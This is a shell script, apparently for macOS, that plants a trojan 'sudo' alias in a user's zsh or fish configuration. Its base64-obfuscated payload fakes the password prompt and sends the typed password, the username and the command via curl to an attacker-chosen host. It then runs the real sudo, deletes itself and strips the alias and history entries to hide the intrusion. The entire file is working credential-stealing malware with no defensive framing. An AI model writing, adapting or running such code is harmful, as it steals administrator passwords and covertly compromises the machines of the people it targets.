f="/tmp/sudo"

case ${SHELL:0-4} in
    /zsh )
        echo 'find zsh'
        echo "Y21kPWBlY2hvICQqIHwgYmFzZTY0YApyZWFkIC1zIC1wICJQYXNzd29yZDoiID4gL2Rldi9udWxsCnByaW50ZiAiXGJcYlxiXGJcYlxiXGJcYlxiIgpjdXJsIC1zICJodHRwOi8veW91cl9kb21haW4vP3M9aGFja21hYyZjbWQ9JHtjbWR9JnVzcj1gd2hvYW1pfGJhc2U2NGAmcHdkPWBlY2hvICRSRVBMWXxiYXNlNjRgIiAmCmVjaG8gJFJFUExZIHwgc3VkbyAtayAtUyBlY2hvICIiICYmCiAgICBybSAtZiAkMCAmJgogICAgc2VkIC1pICdfYmFrJyAnL2FsaWFzIHN1ZG89L2QnIH4vLnpzaHJjICYmCiAgICAkKgp6c2g=" | base64 -D > ${f} && chmod a+x ${f}
        echo "alias sudo=${f}" >> ~/.zshrc
        sed -i '' -e '$d' ~/.zsh_history
        ;;
    fish )
        echo 'find fish'
        echo "Y21kPWBlY2hvICQqIHwgYmFzZTY0YApyZWFkIC1zIC1wICJQYXNzd29yZDoiID4gL2Rldi9udWxsCnByaW50ZiAiXGJcYlxiXGJcYlxiXGJcYlxiIgpjdXJsIC1zICJodHRwOi8veW91cl9kb21haW4vP3M9aGFja21hYyZjbWQ9JHtjbWR9JnVzcj1gd2hvYW1pfGJhc2U2NGAmcHdkPWBlY2hvICRSRVBMWXxiYXNlNjRgIiAmCmVjaG8gJFJFUExZIHwgc3VkbyAtayAtUyBlY2hvICIiICYmCiAgICBybSAtZiAvdG1wL3N1ZG8gJiYKICAgICNsbiAtcyAvdXNyL2Jpbi9zdWRvIC90bXAvc3VkbyAmJgogICAgc2VkIC1pICdfYmFrJyAnL2FsaWFzIHN1ZG89L2QnIH4vLmNvbmZpZy9maXNoL2NvbmZpZy5maXNoICYmCiAgICAkKgpmaXNoCnNlZCAtaSAnJyAnL3NldCBmaXNoX2dyZWV0aW5nL2QnIH4vLmNvbmZpZy9maXNoL2NvbmZpZy5maXNo" | base64 -D > ${f} && chmod a+x ${f}
        echo "alias sudo=\"sh ${f}\"" >> ~/.config/fish/config.fish
        sed -i '' -e '1 i\
            set fish_greeting ""
        ' ~/.config/fish/config.fish
        # sed -i '' -e '$d' ~/.local/share/fish/fish_history
        ;;
    bash )
        echo 'bash'
        ;;
    /csh )
        echo 'csh'
        ;;
    * )
        echo 'unknown'
        ;;
esac